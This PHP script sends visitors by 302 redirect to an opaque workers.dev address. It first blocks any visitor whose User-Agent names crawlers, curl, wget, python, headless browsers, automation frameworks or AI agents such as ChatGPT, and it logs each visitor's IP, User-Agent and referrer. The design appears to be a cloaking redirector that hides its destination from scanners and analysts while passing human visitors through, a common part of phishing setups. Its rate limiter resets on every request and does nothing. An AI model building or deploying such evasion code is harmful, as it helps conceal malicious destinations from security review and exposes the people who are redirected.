<?php
// Configuration
define('REDIRECT_URL', 'https://707e3565.45dea72c27a70fa75e4d6281.workers.dev'); // URL to redirect to
define('RATE_LIMIT', 5); // Max requests per IP per hour

// Bot Detection Logic
$botKeywords = [
    'bot', 'crawl', 'spider', 'slurp', 'search', 'curl', 'wget', 'python', 'php',
    'headless', 'chrome-headless', 'phantomjs', 'selenium', 'playwright', 'puppeteer',
    'chatgpt', 'openai', 'gpt-3', 'gpt-4', 'ai', 'machine learning'
];

// Function to check if the User-Agent indicates a bot
function isBot($userAgent) {
    global $botKeywords;
    $userAgentLower = strtolower($userAgent);

    // Check for common bot indicators in the User-Agent
    foreach ($botKeywords as $keyword) {
        if (strpos($userAgentLower, $keyword) !== false) {
            return true;
        }
    }

    // Additional bot checks for suspicious patterns or very short User-Agent strings
    if (strlen($userAgent) < 10) {
        return true;
    }

    return false;
}

// Rate Limiting Logic
$rateLimitData = []; // Store rate limits in memory (consider using a persistent storage in production)

// Function to check if an IP is rate-limited
function isRateLimited($ip) {
    global $rateLimitData;

    $currentTime = time(); // Get current time in seconds
    $hourAgo = $currentTime - 3600;

    if (isset($rateLimitData[$ip])) {
        // Remove any outdated requests
        $rateLimitData[$ip] = array_filter($rateLimitData[$ip], function($timestamp) use ($hourAgo) {
            return $timestamp > $hourAgo;
        });

        // Check if the user exceeded the rate limit
        if (count($rateLimitData[$ip]) >= RATE_LIMIT) {
            return true; // Exceeded rate limit
        }

        // Add the current timestamp to the list of requests for this IP
        $rateLimitData[$ip][] = $currentTime;
    } else {
        $rateLimitData[$ip] = [$currentTime]; // First request for this IP
    }

    return false; // Not rate limited
}

// Handle the request
function handleRequest() {
    $ip = $_SERVER['REMOTE_ADDR']; // Get the client's IP address
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $referrer = $_SERVER['HTTP_REFERER'] ?? '';

    // Check if the user is a bot or rate-limited
    if (isBot($userAgent) || isRateLimited($ip)) {
        header('HTTP/1.1 403 Forbidden');
        echo 'Access denied.';
        exit;
    }

    // Log the redirection request (in a real app, you could use logging services)
    error_log("Redirecting IP: $ip, User-Agent: $userAgent, Referrer: $referrer");

    // Perform the redirect
    header("Location: " . REDIRECT_URL, true, 302);
    exit;
}

// Execute the request handler
handleRequest();
?>
